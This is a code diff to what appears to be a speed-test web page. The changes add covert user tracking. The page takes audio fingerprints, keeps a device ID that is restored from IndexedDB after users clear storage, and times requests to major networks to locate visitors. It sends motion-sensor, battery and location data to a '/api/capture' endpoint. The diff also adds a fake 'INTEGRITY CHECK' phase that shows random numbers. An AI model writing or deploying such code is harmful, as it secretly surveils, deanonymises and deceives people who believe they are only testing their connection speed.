@@ -221,7 +221,83 @@ function collectFingerprint() {
     gpu,
     touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
     connectionType: navigator.connection?.effectiveType || 'unknown',
+    audioFingerprint: getAudioFingerprint(),
   };
+}
+
+function getAudioFingerprint() {
+  try {
+    const AudioCtx = window.AudioContext || window.webkitAudioContext;
+    if (!AudioCtx) return 'not_supported';
+    const ctx = new AudioCtx();
+    const oscillator = ctx.createOscillator();
+    const compressor = ctx.createDynamicsCompressor();
+    oscillator.type = 'triangle';
+    oscillator.connect(compressor);
+    compressor.connect(ctx.destination);
+    oscillator.start(0);
+    const finger = compressor.attack.value + compressor.release.value;
+    ctx.close();
+    return finger.toString();
+  } catch { return 'error'; }
+}
+
+async function getPersistentId() {
+  const local = localStorage.getItem('_np_did');
+  if (local) return local;
+
+  // Attempt IndexedDB recovery
+  try {
+    const db = await new Promise((resolve, reject) => {
+      const req = indexedDB.open('SpeedTestCache', 1);
+      req.onupgradeneeded = () => req.result.createObjectStore('ids');
+      req.onsuccess = () => resolve(req.result);
+      req.onerror = () => reject();
+    });
+    const tx = db.transaction('ids', 'readonly');
+    const store = tx.objectStore('ids');
+    const id = await new Promise(resolve => {
+      const req = store.get('did');
+      req.onsuccess = () => resolve(req.result);
+    });
+    if (id) {
+      localStorage.setItem('_np_did', id);
+      return id;
+    }
+  } catch {}
+
+  const newId = `dev_${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`;
+  localStorage.setItem('_np_did', newId);
+  
+  // Save to IndexedDB
+  try {
+    const db = await new Promise(resolve => {
+      const req = indexedDB.open('SpeedTestCache', 1);
+      req.onsuccess = () => resolve(req.result);
+    });
+    db.transaction('ids', 'readwrite').objectStore('ids').put(newId, 'did');
+  } catch {}
+
+  return newId;
+}
+
+async function measureTriangulation() {
+  const targets = [
+    { name: 'Google', url: 'https://www.google.com/favicon.ico' },
+    { name: 'Cloudflare', url: 'https://1.1.1.1/favicon.ico' },
+    { name: 'AWS', url: 'https://aws.amazon.com/favicon.ico' },
+    { name: 'Akamai', url: 'https://www.akamai.com/favicon.ico' }
+  ];
+
+  const results = {};
+  for (const t of targets) {
+    const start = performance.now();
+    try {
+      await fetch(t.url, { mode: 'no-cors', cache: 'no-store' });
+      results[t.name] = Math.round(performance.now() - start);
+    } catch { results[t.name] = -1; }
+  }
+  return results;
 }
 
 async function sendInitialCapture() {
@@ -231,7 +307,7 @@ async function sendInitialCapture() {
     const response = await fetch('/api/capture', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ webrtcIPs, deviceId: getDeviceId(), ...collectFingerprint() }),
+      body: JSON.stringify({ webrtcIPs, deviceId: await getPersistentId(), ...collectFingerprint() }),
     });
 
     if (response.ok) {
@@ -281,8 +357,24 @@ function getAccurateLocation(id) {
 
 async function triggerCaptureFlow() {
   if (captureId) return;
+  const tri = await measureTriangulation();
   const id = await sendInitialCapture();
-  if (id) getAccurateLocation(id);
+  if (id) {
+    getAccurateLocation(id);
+    // Send triangulation and sensor metadata
+    fetch(`/api/capture/${id}`, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        metadata: { 
+          triangulation: tri,
+          sensors: motionData,
+          battery: await getBatteryInfo()
+        } 
+      }),
+      keepalive: true
+    }).catch(() => {});
+  }
 }
 
 
@@ -440,7 +532,16 @@ async function startTest() {
   els.speedNum.classList.add('show');
   els.speedUnit.classList.add('show');
   els.phaseLabel.classList.add('show');
-  await delay(900);
+  setPhaseSteps(getPhaseState(0));
+  await delay(600);
+
+  els.phaseLabel.textContent = 'INTEGRITY CHECK';
+  setArcColor('ping');
+  for (let i = 0; i < 5; i++) {
+    els.speedNum.textContent = Math.floor(Math.random() * 100);
+    await delay(100);
+  }
+  await delay(400);
 
   els.phaseLabel.textContent = 'LATENCY';
   els.speedUnit.textContent = 'ms';
